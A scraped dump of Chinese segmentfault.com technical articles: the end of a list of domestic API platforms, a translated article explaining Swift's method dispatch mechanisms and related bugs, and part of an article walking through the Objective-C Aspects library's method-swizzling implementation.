<li><p><a href=""http://www.xfyun.cn/"" rel=""nofollow noreferrer"">讯飞开放平台</a> - 支持语音听写/转写，在线/离线命令词识别，语音唤醒等内容，平台支持广泛，提供相应SDK。</p></li>
</ul>
<h4>综合</h4>
<ul>
<li><p><a href=""http://www.avatardata.cn/Docs"" rel=""nofollow noreferrer"">阿凡达数据</a> - 支持金融股票，充值认证，便民类，新闻文章，医药交通，科教文艺，创意数据，及时通讯等内容。</p></li>
<li><p><a href=""http://www.alidayu.com/"" rel=""nofollow noreferrer"">阿里大于</a> - 支持验证码，短信通知，语音通知，流量钱包充值，私密专线，群发助手等内容。</p></li>
<li><p><a href=""https://www.apix.cn/"" rel=""nofollow noreferrer"">APiX</a> - 支持基础征信数据，信用分析服务，支付缴费接口等数据，部分免费。</p></li>
<li><p><a href=""http://apistore.baidu.com/"" rel=""nofollow noreferrer"">百度API STORE</a> - 支持多种类型数据，部分免费，提供SDK。</p></li>
<li><p><a href=""http://www.haoservice.com/"" rel=""nofollow noreferrer"">HaoService</a> - 支持多种类型数据。</p></li>
<li><p><a href=""https://www.juhe.cn/"" rel=""nofollow noreferrer"">聚合数据</a> - 支持多种类型数据，部分免费。</p></li>
<li><p><a href=""https://m.datayes.com/"" rel=""nofollow noreferrer"">通联数据</a> - 提供金融类数据，支持免费试用。</p></li>
</ul>

                ", 国内值得关注的官方API集合,1531971985,548,1,443,1,1,https://segmentfault.com/a/1190000008149811
77,1,0,6,"
                    
<blockquote><p><strong>原文:</strong> <a href=""https://www.raizlabs.com/dev/2016/12/swift-method-dispatch/?utm_campaign=This%2BWeek%2Bin%2BSwift&amp;utm_medium=email&amp;utm_source=This_Week_in_Swift_114"" rel=""nofollow noreferrer"">Method Dispatch in Swift</a><br><strong>作者:</strong> <a href=""https://www.raizlabs.com/dev/author/brian-kingraizlabs-com/"" rel=""nofollow noreferrer"">Brain King</a><br><strong>译者:</strong> <a href=""https://kemchenj.github.io/"" rel=""nofollow noreferrer"">kemchenj</a></p></blockquote>
<h2>译者注:</h2>
<p>之前看了很多关于 Swift 派发机制的内容, 但感觉没有一篇能够彻底讲清楚这件事情, 看完了这篇文章之后我对 Swift 的派发机制才建立起了初步的认知.</p>
<h1>正文</h1>
<p><span class=""img-wrap""><img data-src=""/img/bVHZRJ?w=755&amp;h=255"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>一张表总结引用类型, 修饰符和它们对于 Swift 函数派发方式的影响.</p>
<p>函数派发就是程序判断使用哪种途径去调用一个函数的机制. 每次函数被调用时都会被触发, 但你又不会太留意的一个东西. 了解派发机制对于写出高性能的代码来说很有必要, 而且也能够解释很多 Swift 里""奇怪""的行为.</p>
<p>编译型语言有三种基础的函数派发方式: <strong>直接派发(Direct Dispatch)</strong>, <strong>函数表派发(Table Dispatch)</strong> 和 <strong>消息机制派发(Message Dispatch)</strong>, 下面我会仔细讲解这几种方式. 大多数语言都会支持一到两种, Java 默认使用函数表派发, 但你可以通过 <code>final</code> 修饰符修改成直接派发. C++ 默认使用直接派发, 但可以通过加上 <code>virtual</code> 修饰符来改成函数表派发. 而 Objective-C 则总是使用消息机制派发, 但允许开发者使用 C 直接派发来获取性能的提高. 这样的方式非常好, 但也给很多开发者带来了困扰,</p>
<blockquote><p>译者注: 想要了解 Swift 底层结构的人, 极度推荐<a href=""https://realm.io/news/goto-mike-ash-exploring-swift-memory-layout-video/"" rel=""nofollow noreferrer"">这段视频</a></p></blockquote>
<h2>派发方式 (Types of Dispatch )</h2>
<p>程序派发的目的是为了告诉 CPU 需要被调用的函数在哪里, 在我们深入 Swift 派发机制之前, 先来了解一下这三种派发方式, 以及每种方式在动态性和性能之间的取舍.</p>
<h3>直接派发 (Direct Dispatch)</h3>
<p>直接派发是最快的, 不止是因为需要调用的指令集会更少, 并且编译器还能够有很大的优化空间, 例如函数内联等, 但这不在这篇博客的讨论范围. 直接派发也有人称为静态调用.</p>
<p>然而, 对于编程来说直接调用也是最大的局限, 而且因为缺乏动态性所以没办法支持继承.</p>
<h3>函数表派发 (Table Dispatch)</h3>
<p>函数表派发是编译型语言实现动态行为最常见的实现方式. 函数表使用了一个数组来存储类声明的每一个函数的指针. 大部分语言把这个称为 ""virtual table""(虚函数表), Swift 里称为 ""witness table"". 每一个类都会维护一个函数表, 里面记录着类所有的函数, 如果父类函数被 override 的话, 表里面只会保存被 override 之后的函数. 一个子类新添加的函数, 都会被插入到这个数组的最后. 运行时会根据这一个表去决定实际要被调用的函数.</p>
<p>举个例子, 看看下面两个类:</p>
<pre><code class=""swift"">class ParentClass {
    func method1() {}
    func method2() {}
}
class ChildClass: ParentClass {
    override func method2() {}
    func method3() {}
}</code></pre>
<p>在这个情况下, 编译器会创建两个函数表, 一个是 <code>ParentClass</code> 的, 另一个是 <code>ChildClass</code>的:</p>
<p><span class=""img-wrap""><img data-src=""/img/bVHZRK?w=768&amp;h=227"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>这张表展示了 ParentClass 和 ChildClass 虚数表里 method1, method2, method3 在内存里的布局.</p>
<pre><code class=""swift"">let obj = ChildClass()
obj.method2()</code></pre>
<p>当一个函数被调用时, 会经历下面的几个过程:</p>
<ol>
<li><p>读取对象 <code>0xB00</code> 的函数表.</p></li>
<li><p>读取函数指针的索引. 在这里, <code>method2</code> 的索引是1(偏移量), 也就是 <code>0xB00 + 1</code>.</p></li>
<li><p>跳到 <code>0x222</code> (函数指针指向 0x222)</p></li>
</ol>
<p>查表是一种简单, 易实现, 而且性能可预知的方式. 然而, 这种派发方式比起直接派发还是慢一点. 从字节码角度来看, 多了两次读和一次跳转, 由此带来了性能的损耗. 另一个慢的原因在于编译器可能会由于函数内执行的任务导致无法优化. (如果函数带有副作用的话)</p>
<p>这种基于数组的实现, 缺陷在于函数表无法拓展. 子类会在虚数函数表的最后插入新的函数, 没有位置可以让 extension 安全地插入函数. 这篇<a href=""https://lists.swift.org/pipermail/swift-evolution/Week-of-Mon-20151207/001922.html"" rel=""nofollow noreferrer"">提案</a>很详细地描述了这么做的局限.</p>
<h3>消息机制派发 (Message Dispatch )</h3>
<p>消息机制是调用函数最动态的方式. 也是 Cocoa 的基石, 这样的机制催生了 <a href=""https://developer.apple.com/library/content/documentation/Cocoa/Conceptual/KeyValueObserving/KeyValueObserving.html"" rel=""nofollow noreferrer"">KVO</a>, <a href=""https://developer.apple.com/reference/uikit/uiappearance"" rel=""nofollow noreferrer"">UIAppearence</a> 和 <a href=""https://developer.apple.com/library/content///documentation/Cocoa/Conceptual/CoreData/index.html"" rel=""nofollow noreferrer"">CoreData</a> 等功能. 这种运作方式的关键在于开发者可以在运行时改变函数的行为. 不止可以通过 <a href=""https://www.mikeash.com/pyblog/friday-qa-2010-01-29-method-replacement-for-fun-and-profit.html"" rel=""nofollow noreferrer"">swizzling</a> 来改变, 甚至可以用 <a href=""http://stackoverflow.com/a/38878119/255489"" rel=""nofollow noreferrer"">isa-swizzling</a> 修改对象的继承关系, 可以在面向对象的基础上实现自定义派发.</p>
<p>举个例子, 看看下面两个类:</p>
<pre><code class=""swift"">class ParentClass {
    dynamic func method1() {}
    dynamic func method2() {}
}
class ChildClass: ParentClass {
    override func method2() {}
    dynamic func method3() {}
}</code></pre>
<p>Swift 会用树来构建这种继承关系:</p>
<p><span class=""img-wrap""><img data-src=""/img/bVHZRU?w=768&amp;h=412"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>这张图很好地展示了 Swift 如何使用树来构建类和子类.</p>
<p>当一个消息被派发, 运行时会顺着类的继承关系向上查找应该被调用的函数. 如果你觉得这样做效率很低, 它确实很低! 然而, 只要缓存建立了起来, 这个查找过程就会通过缓存来把性能提高到和函数表派发一样快. 但这只是消息机制的原理, 这里有<a href=""http://www.friday.com/bbum/2009/12/18/objc_msgsend-part-1-the-road-map/"" rel=""nofollow noreferrer"">一篇文章</a>很深入的讲解了具体的技术细节.</p>
<h2>Swift 的派发机制</h2>
<p>那么, 到底 Swift 是怎么派发的呢? 我没能找到一个很简明扼要的答案, 但这里有四个选择具体派发方式的因素存在:</p>
<ol>
<li><p><strong>声明的位置</strong></p></li>
<li><p><strong>引用类型</strong></p></li>
<li><p><strong>特定的行为</strong></p></li>
<li><p><strong>显式地优化</strong>(Visibility Optimizations)</p></li>
</ol>
<p>在解释这些因素之前, 我有必要说清楚, Swift 没有在文档里具体写明什么时候会使用函数表什么时候使用消息机制. 唯一的承诺是使用 <code>dynamic</code> 修饰的时候会通过 Objective-C 的运行时进行消息机制派发. 下面我写的所有东西, 都只是我在 Swift 3.0 里测试出来的结果, 并且很可能在之后的版本更新里进行修改.</p>
<h3>声明的位置 (Location Matters)</h3>
<p>在 Swift 里, 一个函数有两个可以声明的位置: 类型声明的作用域, 和 extension. 根据声明类型的不同, 也会有不同的派发方式.</p>
<pre><code class=""swift"">class MyClass {
    func mainMethod() {}
}
extension MyClass {
    func extensionMethod() {}
}</code></pre>
<p>上面的例子里, <code>mainMethod</code> 会使用函数表派发, 而 <code>extensionMethod</code> 则会使用直接派发. 当我第一次发现这件事情的时候觉得很意外, 直觉上这两个函数的声明方式并没有那么大的差异. 下面是我根据类型, 声明位置总结出来的函数派发方式的表格.</p>
<p><span class=""img-wrap""><img data-src=""/img/bVHZR3?w=768&amp;h=503"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>这张表格展示了默认情况下 Swift 使用的派发方式.</p>
<p>总结起来有这么几点:</p>
<ul>
<li><p>值类型总是会使用直接派发, 简单易懂</p></li>
<li><p>而协议和类的 extension 都会使用直接派发</p></li>
<li><p><code>NSObject</code> 的 extension 会使用消息机制进行派发</p></li>
<li><p><code>NSObject</code> 声明作用域里的函数都会使用函数表进行派发.</p></li>
<li><p>协议里声明的, 并且带有默认实现的函数会使用函数表进行派发</p></li>
</ul>
<h3>引用类型 (Reference Type Matters)</h3>
<p>引用的类型决定了派发的方式. 这很显而易见, 但也是决定性的差异. 一个比较常见的疑惑, 发生在一个协议拓展和类型拓展同时实现了同一个函数的时候.</p>
<pre><code class=""swift"">protocol MyProtocol {
}
struct MyStruct: MyProtocol {
}
extension MyStruct {
    func extensionMethod() {
        print(""结构体"")
    }
}
extension MyProtocol {
    func extensionMethod() {
        print(""协议"")
    }
}
 
let myStruct = MyStruct()
let proto: MyProtocol = myStruct
 
myStruct.extensionMethod() // -&gt; “结构体”
proto.extensionMethod() // -&gt; “协议”</code></pre>
<p>刚接触 Swift 的人可能会认为 <code>proto.extensionMethod()</code> 调用的是结构体里的实现. 但是, 引用的类型决定了派发的方式, 协议拓展里的函数会使用直接调用. 如果把 <code>extensionMethod</code> 的声明移动到协议的声明位置的话, 则会使用函数表派发, 最终就会调用结构体里的实现. 并且要记得, 如果两种声明方式都使用了直接派发的话, 基于直接派发的运作方式, 我们不可能实现预想的 <code>override</code> 行为. 这对于很多从 Objective-C 过渡过来的开发者是反直觉的.</p>
<p>Swift JIRA(缺陷跟踪管理系统) 也发现了几个 <a href=""https://bugs.swift.org/browse/SR-1422"" rel=""nofollow noreferrer"">bugs</a>, Swfit-Evolution 邮件列表里有<a href=""https://lists.swift.org/pipermail/swift-evolution/Week-of-Mon-20151207/000983.html"" rel=""nofollow noreferrer"">一大堆</a><a href=""https://lists.swift.org/pipermail/swift-evolution/Week-of-Mon-20151207/thread.html#983"" rel=""nofollow noreferrer"">讨论</a>, 也有<a href=""https://nomothetis.svbtle.com/the-ghost-of-swift-bugs-future"" rel=""nofollow noreferrer"">一大堆博客</a>讨论过这个. 但是, 这好像是故意这么做的, 虽然官方文档没有提过这件事情</p>
<h3>指定派发方式 (Specifying Dispatch Behavior)</h3>
<p>Swift 有一些修饰符可以指定派发方式.</p>
<h4>final</h4>
<p><code>final</code> 允许类里面的函数使用直接派发. 这个修饰符会让函数失去动态性. 任何函数都可以使用这个修饰符, 就算是 extension 里本来就是直接派发的函数. 这也会让 Objective-C 的运行时获取不到这个函数, 不会生成相应的 selector.</p>
<h4>dynamic</h4>
<p><code>dynamic</code> 可以让类里面的函数使用消息机制派发. 使用 <code>dynamic</code>, 必须导入 <code>Foundation</code> 框架, 里面包括了 <code>NSObject</code> 和 Objective-C 的运行时. <code>dynamic</code> 可以让声明在 extension 里面的函数能够被 override. <code>dynamic</code> 可以用在所有 <code>NSObject</code> 的子类和 Swift 的原声类.</p>
<h4>@objc &amp; @nonobjc</h4>
<p><code>@objc</code> 和 <code>@nonobjc</code> 显式地声明了一个函数是否能被 Objective-C 的运行时捕获到. 使用 <code>@objc</code> 的典型例子就是给 selector 一个命名空间 <code>@objc(abc_methodName)</code>, 让这个函数可以被 Objective-C 的运行时调用. <code>@nonobjc</code> 会改变派发的方式, 可以用来禁止消息机制派发这个函数, 不让这个函数注册到 Objective-C 的运行时里. 我不确定这跟 <code>final</code> 有什么区别, 因为从使用场景来说也几乎一样. 我个人来说更喜欢 <code>final</code>, 因为意图更加明显.</p>
<blockquote><p>译者注: 我个人感觉, 这这主要是为了跟 Objective-C 兼容用的, <code>final</code> 等原生关键词, 是让 Swift 写服务端之类的代码的时候可以有原生的关键词可以使用.</p></blockquote>
<h4>final @objc</h4>
<p>可以在标记为 <code>final</code> 的同时, 也使用 <code>@objc</code> 来让函数可以使用消息机制派发. 这么做的结果就是, 调用函数的时候会使用直接派发, 但也会在 Objective-C 的运行时里注册响应的 selector. 函数可以响应 <code>perform(selector:)</code> 以及别的 Objective-C 特性, 但在直接调用时又可以有直接派发的性能.</p>
<h4>@inline</h4>
<p>Swift 也支持 <code>@inline</code>, 告诉编译器可以使用直接派发. 有趣的是, <code>dynamic @inline(__always) func dynamicOrDirect() {}</code> 也可以通过编译! 但这也只是告诉了编译器而已, 实际上这个函数还是会使用消息机制派发. 这样的写法看起来像是一个未定义的行为, 应该避免这么做.</p>
<h4>修饰符总结 (Modifier Overview)</h4>
<p><span class=""img-wrap""><img data-src=""/img/bVHZSb?w=731&amp;h=629"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>这张图总结这些修饰符对于 Swift 派发方式的影响. </p>
<p>如果你想查看上面所有例子的话, 请看<a href=""https://gist.github.com/KingOfBrian/778dc93bffddf25b2c414360727c273b#file-message-swift"" rel=""nofollow noreferrer"">这里</a>.</p>
<h3>可见的都会被优化 (Visibility Will Optimize)</h3>
<p>Swift 会尽最大能力去优化函数派发的方式. 例如, 如果你有一个函数从来没有 override, Swift 就会检车并且在可能的情况下使用直接派发. 这个优化大多数情况下都表现得很好, 但对于使用了 target / action 模式的 Cocoa 开发者就不那么友好了. 例如:</p>
<pre><code class=""swift"">override func viewDidLoad() {
    super.viewDidLoad()
    navigationItem.rightBarButtonItem = UIBarButtonItem(
        title: ""登录"", style: .plain, target: nil,
        action: #selector(ViewController.signInAction)
    )
}
private func signInAction() {}</code></pre>
<p>这里编译器会抛出一个错误: <code>Argument of '#selector' refers to a method that is not exposed to Objective-C (Objective-C 无法获取 #selector 指定的函数)</code>. 你如果记得 Swift 会把这个函数优化为直接派发的话, 就能理解这件事情了. 这里修复的方式很简单: 加上 <code>@objc</code> 或者 <code>dynamic</code> 就可以保证 Objective-C 的运行时可以获取到函数了. 这种类型的错误也会发生在<code>UIAppearance</code> 上, 依赖于 proxy 和 <code>NSInvocation</code> 的代码. </p>
<p>另一个需要注意的是, 如果你没有使用 <code>dynamic</code> 修饰的话, 这个优化会默认让 KVO 失效. 如果一个属性绑定了 KVO 的话, 而这个属性的 getter 和 setter 会被优化为直接派发, 代码依旧可以通过编译, 不过动态生成的 KVO 函数就不会被触发.</p>
<p>Swift 的博客有一篇<a href=""https://developer.apple.com/swift/blog/?id=27"" rel=""nofollow noreferrer"">很赞的文章</a>描述了相关的细节, 和这些优化背后的考虑.</p>
<h4>派发总结 (Dispatch Summary)</h4>
<p>这里有一大堆规则要记住, 所以我整理了一个表格:</p>
<p><span class=""img-wrap""><img data-src=""/img/bVHZSh?w=768&amp;h=380"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""clipboard.png"" title=""clipboard.png""></span></p>
<p>这张表总结引用类型, 修饰符和它们对于 Swift 函数派发的影响</p>
<h2>NSObject 以及动态性的损失 (NSObject and the Loss of Dynamic Behavior)</h2>
<p>不久之前还有一群 Cocoa 开发者<a href=""http://mjtsai.com/blog/2016/05/21/dynamic-swift-2/"" rel=""nofollow noreferrer"">讨论动态行为带来的问题</a>. 这段讨论很有趣, 提了一大堆不同的观点. 我希望可以在这里继续探讨一下, 有几个 Swift 的派发方式我觉得损害了动态性, 顺便说一下我的解决方案.</p>
<h3>NSObject 的函数表派发 (Table Dispatch in NSObject)</h3>
<p>上面, 我提到 <code>NSObject</code> 子类定义里的函数会使用函数表派发. 但我觉得很迷惑, 很难解释清楚, 并且由于下面几个原因, 这也只带来了一点点性能的提升:</p>
<ul>
<li><p>大部分 <code>NSObject</code> 的子类都是在 <code>obj_msgSend</code> 的基础上构建的. 我很怀疑这些派发方式的优化, 实际到底会给 Cocoa 的子类带来多大的提升.</p></li>
<li><p>大多数 Swift 的 <code>NSObject</code> 子类都会使用 extension 进行拓展, 都没办法使用这种优化.</p></li>
</ul>
<p>最后, 有一些小细节会让派发方式变得很复杂.</p>
<h3>派发方式的优化破坏了 NSObject 的功能 (Dispatch Upgrades Breaking NSObject Features)</h3>
<p>性能提升很棒, 我很喜欢 Swift 对于派发方式的优化. 但是, <code>UIView</code> 子类颜色的属性理论上性能的提升破坏了 UIKit 现有的模式.</p>
<blockquote><p>原文: However, having a theoretical performance boost in my <code>UIView</code> subclass color property breaking an established pattern in UIKit is damaging to the language.</p></blockquote>
<h3>NSObject 作为一个选择  (NSObject as a Choice)</h3>
<p>使用静态派发的话结构体是个不错的选择, 而使用消息机制派发的话则可以考虑 <code>NSObject</code>. 现在, 如果你想跟一个刚学 Swift 的开发者解释为什么某个东西是一个 <code>NSObject</code> 的子类, 你不得不去介绍 Objective-C 以及这段历史. 现在没有任何理由去继承 <code>NSObject</code> 构建类, 除非你需要使用 Objective-C 构建的框架.</p>
<p>目前, <code>NSObject</code> 在 Swift 里的派发方式, 一句话总结就是<strong>复杂</strong>, 跟理想还是有差距. 我比较想看到这个修改: 当你继承 <code>NSObject</code> 的时候, 这是一个你想要完全使用动态消息机制的表现.</p>
<h3>显式的动态性声明 (Implicit Dynamic Modification)</h3>
<p>另一个 Swift 可以改进的地方就是函数动态性的检测. 我觉得在检测到一个函数被 <code>#selector</code> 和 <code>#keypath</code> 引用时要自动把这些函数标记为 <code>dynamic</code>, 这样的话就会解决大部分 <code>UIAppearance</code> 的动态问题, 但也许有别的编译时的处理方式可以标记这些函数.</p>
<h2>Error 以及 Bug (Errors and Bugs)</h2>
<p>为了让我们对 Swift 的派发方式有更多了解, 让我们来看一下 Swift 开发者遇到过的 error.</p>
<h3>SR-584</h3>
<p>这个 <a href=""https://bugs.swift.org/browse/SR-584"" rel=""nofollow noreferrer"">Swift bug</a> 是 Swift 函数派发的一个功能. 存在于 <code>NSObject</code> 子类声明的函数(函数表派发), 以及声明在 extension 的函数(消息机制派发)中. 为了更好地描述这个情况, 我们先来创建一个类:</p>
<pre><code class=""swift"">class Person: NSObject {
    func sayHi() {
        print(""Hello"")
    }
}
func greetings(person: Person) {
    person.sayHi()
}
greetings(person: Person()) // prints 'Hello'</code></pre>
<p><code>greetings(person:)</code> 函数使用函数表派发来调用 <code>sayHi()</code>. 就像我们看到的, 期望的, ""Hello"" 会被打印. 没什么好讲的地方, 那现在让我们继承 <code>Persion</code>:</p>
<pre><code class=""swift"">class MisunderstoodPerson: Person {}
extension MisunderstoodPerson {
    override func sayHi() {
        print(""No one gets me."")
    }
}

greetings(person: MisunderstoodPerson()) // prints 'Hello'</code></pre>
<p><strong>可以看到, <code>sayHi()</code> 函数是在 extension 里声明的, 会使用消息机制进行调用. 当<code>greetings(person:)</code> 被触发时, <code>sayHi()</code> 会通过函数表被派发到 <code>Person</code> 对象, 而<code>misunderstoodPerson</code> 重写之后会是用消息机制, 而 <code>MisunderstoodPerson</code> 的函数表依旧保留了 <code>Person</code> 的实现, 紧接着歧义就产生了.</strong></p>
<p>在这里的解决方法是保证函数使用相同的消息派发机制. 你可以给函数加上 <code>dynamic</code> 修饰符, 或者是把函数的实现从 extension 移动到类最初声明的作用域里.</p>
<p>理解了 Swift 的派发方式, 就能够理解这个行为产生的原因了, 虽然 Swift 不应该让我们遇到这个问题.</p>
<h3>SR-103</h3>
<p>这个 <a href=""https://bugs.swift.org/browse/SR-103"" rel=""nofollow noreferrer"">Swift bug</a> 触发了定义在协议拓展的默认实现, 即使是子类已经实现这个函数的情况下. 为了说明这个问题, 我们先定义一个协议, 并且给里面的函数一个默认实现:</p>
<pre><code class=""swift"">protocol Greetable {
    func sayHi()
}
extension Greetable {
    func sayHi() {
        print(""Hello"")
    }
}
func greetings(greeter: Greetable) {
    greeter.sayHi()
}</code></pre>
<p>现在, 让我们定义一个遵守了这个协议的类. 先定义一个 <code>Person</code> 类, 遵守 <code>Greetable</code> 协议, 然后定义一个子类 <code>LoudPerson</code>, 重写 <code>sayHi()</code> 方法.</p>
<pre><code class=""swift"">class Person: Greetable {
}
class LoudPerson: Person {
    func sayHi() {
        print(""HELLO"")
    }
}</code></pre>
<p>你们发现 <code>LoudPerson</code> 实现的函数前面没有 <code>override</code> 修饰, 这是一个提示, 也许代码不会像我们设想的那样运行. 在这个例子里, <code>LoudPerson</code> 没有在 <code>Greetable</code> 的协议记录表(Protocol Witness Table)里成功注册, 当 <code>sayHi()</code> 通过 <code>Greetable</code> 协议派发时, 默认的实现就会被调用.</p>
<p>解决的方法就是, 在类声明的作用域里就要提供所有协议里定义的函数, 即使已经有默认实现. 或者, 你可以在类的前面加上一个 <code>final</code> 修饰符, 保证这个类不会被继承.</p>
<p>Doug Gregor 在 <a href=""https://lists.swift.org/pipermail/swift-evolution/Week-of-Mon-20151207/000928.html"" rel=""nofollow noreferrer"">Swift-Evolution 邮件列表</a>里提到, 通过显式地重新把函数声明为类的函数, 就可以解决这个问题, 并且不会偏离我们的设想.</p>
<h3>其它 bug (Other bugs)</h3>
<p>Another bug that I thought I’d mention is <a href=""https://bugs.swift.org/browse/SR-435"" rel=""nofollow noreferrer"">SR-435</a>. It involves two protocol extensions, where one extension is more specific than the other. The example in the bug shows one un-constrained extension, and one extension that is constrained to <code>Equatable</code> types. When the method is invoked inside a protocol, the more specific method is not called. I’m not sure if this always occurs or not, but seems important to keep an eye on.</p>
<p>另外一个 bug 我在 <a href=""https://bugs.swift.org/browse/SR-435"" rel=""nofollow noreferrer"">SR-435</a> 里已经提过了. 当有两个协议拓展, 而其中一个更加具体时就会触发. 例如, 有一个不受约束的 extension, 而另一个被 <code>Equatable</code> 约束, 当这个方法通过协议派发, 约束比较多的那个 extension 的实现则不会被调用. 我不太确定这是不是百分之百能复现, 但有必要留个心眼.</p>
<p>If you are aware of any other Swift dispatch bugs, <a href=""https://twitter.com/kingofbrian"" rel=""nofollow noreferrer"">drop me a line</a> and I’ll update this blog post.</p>
<p>如果你发现了其它 Swift 派发的 bug 的话, <a href=""https://twitter.com/kingofbrian"" rel=""nofollow noreferrer"">@一下我</a>我就会更新到这篇博客里.</p>
<h3>有趣的 Error (Interesting Error)</h3>
<p>有一个很好玩的编译错误, 可以窥见到 Swift 的计划. 就像之前说的, 类拓展使用直接派发, 所以你试图 override 一个声明在 extension 里的函数的时候会发生什么?</p>
<pre><code class=""swift"">class MyClass {
}
extension MyClass {
    func extensionMethod() {}
}
 
class SubClass: MyClass {
    override func extensionMethod() {}
}</code></pre>
<p>上面的代码会触发一个编译错误 <code>Declarations in extensions can not be overridden yet</code>(声明在 extension 里的方法不可以被重写). 这可能是 Swift 团队打算加强函数表派发的一个征兆. 又或者这只是我过度解读, 觉得这门语言可以优化的地方.</p>
<h2>致谢 Thanks</h2>
<p>我希望了解函数派发机制的过程中你感受到了乐趣, 并且可以帮助你更好的理解 Swift. 虽然我抱怨了 <code>NSObject</code> 相关的一些东西, 但我还是觉得 Swift 提供了高性能的可能性, 我只是希望可以有足够简单的方式, 让这篇博客没有存在的必要.</p>

                ", 深入理解 Swift 派发机制,1531971987,168,1,732,1,1,https://segmentfault.com/a/1190000008063625
78,1,0,6,"
                    
<p>都传闻说 OC 的运行时非常NB，今天就来看看非常有名的<code>Aspects</code>，源码在这</p>
<p><a href=""https://github.com/steipete/Aspects"" rel=""nofollow noreferrer"">https://github.com/steipete/A...</a></p>
<p>里面的内容非常简单，其实就2个文件，<code>Aspect.h</code>和<code>Aspect.m</code>，它使用<code>Category</code>为<code>NSObject</code>提供了两个额外的方法，API如下：</p>
<pre><code class=""objc"">/// Adds a block of code before/instead/after the current `selector` for a specific class.
///
/// @param block Aspects replicates the type signature of the method being hooked.
/// The first parameter will be `id&lt;AspectInfo&gt;`, followed by all parameters of the method.
/// These parameters are optional and will be filled to match the block signature.
/// You can even use an empty block, or one that simple gets `id&lt;AspectInfo&gt;`.
///
/// @note Hooking static methods is not supported.
/// @return A token which allows to later deregister the aspect.
+ (id&lt;AspectToken&gt;)aspect_hookSelector:(SEL)selector
                      withOptions:(AspectOptions)options
                       usingBlock:(id)block
                            error:(NSError **)error;

/// Adds a block of code before/instead/after the current `selector` for a specific instance.
- (id&lt;AspectToken&gt;)aspect_hookSelector:(SEL)selector
                      withOptions:(AspectOptions)options
                       usingBlock:(id)block
                            error:(NSError **)error;

/// Deregister an aspect.
/// @return YES if deregistration is successful, otherwise NO.
id&lt;AspectToken&gt; aspect = ...;
[aspect remove];</code></pre>
<p>它提供的解决方案就是为一个消息提供一个 before 和 after 的 block 调用，也就是为 OC 提供了 AOP 的能力。<br>我们知道在 Java 中，实现 AOP 采用的是动态代理的方式，那么在 OC 中的实现，其实就是通过 Swizzle Method 的方式进行啦。</p>
<h2>一探究竟</h2>
<p>看下 Aspects 到底是如何实现这个功能的</p>
<pre><code class=""objc"">+ (id&lt;AspectToken&gt;)aspect_hookSelector:(SEL)selector
                      withOptions:(AspectOptions)options
                       usingBlock:(id)block
                            error:(NSError **)error {
    return aspect_add((id)self, selector, options, block, error);
}

/// @return A token which allows to later deregister the aspect.
- (id&lt;AspectToken&gt;)aspect_hookSelector:(SEL)selector
                      withOptions:(AspectOptions)options
                       usingBlock:(id)block
                            error:(NSError **)error {
    return aspect_add(self, selector, options, block, error);
}</code></pre>
<p>事实上，不管是静态还是动态方式添加，都是使用<code>aspect_add</code>这个方法，</p>
<pre><code class=""objc"">static id aspect_add(id self, SEL selector, AspectOptions options, id block, NSError **error) {
    NSCParameterAssert(self);
    NSCParameterAssert(selector);
    NSCParameterAssert(block);

    __block AspectIdentifier *identifier = nil;

    // ...
    // 省略加锁的 block 和 权限检查

    // 看 aspect_getContainerForObject 源码可知，使用 lazy load 的方式，为 self 生成一个 AspectsContainer
    AspectsContainer *aspectContainer = aspect_getContainerForObject(self, selector);
    identifier = [AspectIdentifier identifierWithSelector:selector object:self options:options block:block error:error];
    if (identifier) {
        [aspectContainer addAspect:identifier withOptions:options];

        // Modify the class to allow message interception.
        aspect_prepareClassAndHookSelector(self, selector, error);
    }
    return identifier;
}</code></pre>
<p>好了，这里的大头是<code>aspect_prepareClassAndHookSelector</code></p>
<pre><code>static void aspect_prepareClassAndHookSelector(NSObject *self, SEL selector, NSError **error) {
    NSCParameterAssert(selector);

    // 下面一行代码，是动态生成了一个子类，然后覆盖了原先的 forwardInvocation 消息，这是这里最 magic 的地方，以下会讲到
    Class klass = aspect_hookClass(self, error);
    Method targetMethod = class_getInstanceMethod(klass, selector);
    IMP targetMethodIMP = method_getImplementation(targetMethod);

    // 检查如果目标方法的实现还不是 _objc_msgForward 或者 _objc_msgForward_stret 的话，就进行 hook
    if (!aspect_isMsgForwardIMP(targetMethodIMP)) {
        // Make a method alias for the existing method implementation, it not already copied.
        const char *typeEncoding = method_getTypeEncoding(targetMethod);

        // 给我们需要被取代的 selector 取一个别名
        SEL aliasSelector = aspect_aliasForSelector(selector);
        if (![klass instancesRespondToSelector:aliasSelector]) {

            // 为类增加一个名字为 aliasSelector， 实现为 selector 的消息
            __unused BOOL addedAlias = class_addMethod(klass, aliasSelector, method_getImplementation(targetMethod), typeEncoding);
            NSCAssert(addedAlias, @""Original implementation for %@ is already copied to %@ on %@"", NSStringFromSelector(selector), NSStringFromSelector(aliasSelector), klass);
        }

        // 把原先的 selector 方法的实现指向 _objc_msgForward 或 _objc_msgForward_stret。
        // 在先前调用了 aspect_hookClass 里面，hook 了 forwardInvocation，后文会说明
        // We use forwardInvocation to hook in.
        class_replaceMethod(klass, selector, aspect_getMsgForwardIMP(self, selector), typeEncoding);
        AspectLog(@""Aspects: Installed hook for -[%@ %@]."", klass, NSStringFromSelector(selector));
    }
}</code></pre>
<p>好了，经过这么多步骤后，我们理清一下思路，如果我们要对<code>@selector(viewDidLoad:)</code>进行 hook</p>
<ol>
<li><p>先创建 subclass, hook @selector(forwardInvocation:)，并把当前的对象设置为该类的对象，这样在不污染原类的情况下，实现了<code>forwardInvocation</code>的hook</p></li>
<li><p>为我们的 obj 的目标消息创建一个别名，这里如果是<code>viewDidLoad:</code>的话，那别名就是<code>aspects_viewDidLoad:</code></p></li>
<li><p>取代目标消息的实现，使用<code>aspect_getMsgForwardIMP</code>来选择是 _objc_msgForward 或是 _objc_msgForward_stret</p></li>
</ol>
